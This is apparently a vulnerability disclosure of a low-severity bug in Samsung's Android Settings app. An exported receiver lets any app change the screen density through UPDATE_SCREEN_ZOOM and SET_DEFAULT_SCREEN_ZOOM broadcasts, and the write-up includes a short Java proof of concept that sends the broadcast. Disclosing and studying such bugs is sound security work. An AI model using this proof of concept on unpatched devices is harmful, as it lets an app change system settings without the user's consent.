# Details

<table>
    <tr>
        <td>Name</td>
        <td>Settings</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.android.settings</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.12</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/081.%20Settings%20—%20Changing%20device%20density/Oversecured_report.png)

Oversecured found a receiver in the Settings app that handles actions in the `com/samsung/android/settings/display/ScreenZoomSettingsReceiver.java` file:
- `com.samsung.intent.action.UPDATE_SCREEN_ZOOM`, increases the current device density
- `com.samsung.intent.action.SET_DEFAULT_SCREEN_ZOOM`, restores default settings

**Proof of Concept**

Increasing density:
```java
Intent i = new Intent("com.samsung.intent.action.UPDATE_SCREEN_ZOOM");
i.setPackage("com.android.settings");
sendBroadcast(i);
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
